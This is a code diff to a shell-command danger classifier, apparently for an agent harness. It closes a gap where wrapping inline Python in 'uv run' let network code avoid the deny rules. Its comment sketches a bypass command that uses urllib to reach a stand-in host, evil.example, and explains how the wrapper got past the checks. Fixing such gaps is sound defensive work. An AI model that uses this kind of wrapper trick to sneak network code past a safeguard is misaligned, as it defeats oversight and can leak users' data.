@@ -1631,6 +1631,24 @@ function classifySingleCommand(command: string): ClassifyResult {
         targetPaths: [],
       }
     }
+    // R12-followup (allow-side gap found in final pre-release review):
+    // `uv run python3 -c "import urllib.request; ...evil.example..."` rode
+    // local_exec below — the wrapped interpreter's inline code never entered
+    // the danger nets (`python3 -c` alone and `env python3 -c` both deny the
+    // same code). Strip the uv wrapper (flags included) and re-classify the
+    // interpreter command, mirroring the bash -c recursion; local scripts
+    // (`uv run script.py`) and version probes still fall through to local_exec.
+    if (uvSub === 'run') {
+      const afterRun = rest
+        .replace(/^run\s+/, '')
+        .replace(/^(?:--[a-zA-Z0-9-]+(?:\s+\S+)?\s+)+/, '')
+        .trim()
+      const interp = afterRun.split(/\s+/)[0]?.toLowerCase().split('/').pop() ?? ''
+      if (LOCAL_EXEC_COMMANDS.has(interp) || PY_INTERPRETER_RE.test(interp)) {
+        const inner = classifyBashCommand(afterRun, [])
+        if (inner.category !== 'local_exec') return inner
+      }
+    }
     return {
       category: 'local_exec',
       reason: `uv local task: ${fullCmd}`,
